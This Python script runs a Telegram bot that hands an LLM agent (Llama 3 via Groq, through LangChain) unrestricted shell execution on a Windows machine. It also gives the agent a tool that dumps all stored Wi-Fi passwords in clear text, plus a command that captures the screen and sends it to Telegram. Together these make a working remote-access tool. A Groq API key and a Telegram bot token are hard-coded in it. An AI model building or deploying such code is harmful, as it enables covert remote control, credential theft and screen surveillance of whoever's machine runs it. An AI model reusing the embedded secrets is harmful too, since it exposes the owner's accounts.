from telegram.ext import Application, MessageHandler, CommandHandler, filters
from langchain.agents import Tool
from langchain import hub
from langchain.agents import AgentExecutor, create_react_agent
from langchain_groq import ChatGroq
import subprocess
import re
import pyautogui

# Allowed chat ID
ALLOWED_CHAT_ID = 1059393984

# AI Bot Tools
def get_stored_wifi_passwords(n):
    profiles_data = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
    profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data.stdout)
    
    wifi_passwords = {}
    for profile in profiles:
        profile = profile.strip()
        profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
        password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info.stdout)
        
        if password_match:
            wifi_passwords[profile] = password_match.group(1)
        else:
            wifi_passwords[profile] = None
    
    return wifi_passwords

def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except Exception as e:
        return str(e)

# Define tools for AI
shell_command_tool = Tool(
    name="Execute shell command",
    func=execute_shell_command,
    description="Executes the provided shell command and returns the result. You need to provide proper Windows commands as arguments."
)

get_stored_wifi_passwords_tool = Tool(
    name="get the wifi passwords of my machine",
    func=get_stored_wifi_passwords,
    description="helps to retive the forgotten wifi passwords in the machine. execute and returns wifi passwords"
)

# Load ReAct prompt
prompt_react = hub.pull("hwchase17/react")

# Initialize ChatGroq model
model = ChatGroq(model_name="llama3-70b-8192", groq_api_key="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", temperature=0)

# Create ReAct agent
tools = [shell_command_tool, get_stored_wifi_passwords_tool]
react_agent = create_react_agent(model, tools=tools, prompt=prompt_react)
react_agent_executor = AgentExecutor(agent=react_agent, tools=tools, verbose=True, handle_parsing_errors=True)

# Telegram Bot: Command to send photo (screenshot)
async def send_photo(update, context) -> None:
    """Send a photo (screenshot) to the user."""
    if update.message.chat_id == ALLOWED_CHAT_ID:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        
        # Send screenshot back to user
        caption = "Here's your screenshot!"
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(screenshot_path, 'rb'), caption=caption)
    else:
        await update.message.reply_text("Unauthorized access. You are not allowed to use this bot.")

# Telegram Bot: Handle user input for AI
async def handle_command(update, context):
    user_input = update.message.text
    chat_id = update.message.chat_id  # Get the chat ID

    if chat_id == ALLOWED_CHAT_ID:
        # Pass input to AI agent
        try:
            ai_output = react_agent_executor.invoke({"input": user_input})
            response = ai_output['output']
        except Exception as e:
            response = f"Error: {str(e)}"
    else:
        response = "Unauthorized access. You are not allowed to use this bot."

    # Send the AI's response back to the user
    await context.bot.send_message(chat_id=chat_id, text=response)

def main():
    app = Application.builder().token("7456059922:AAHPG-OTxBSLoslySTwnCdVC49V95wQYyAk").build()
    
    # Add command handler for sending screenshot
    app.add_handler(CommandHandler("screenshot", send_photo))
    
    # Add handler for AI commands
    app.add_handler(MessageHandler(filters.TEXT, handle_command))
    
    app.run_polling()

if __name__ == "__main__":
    main()
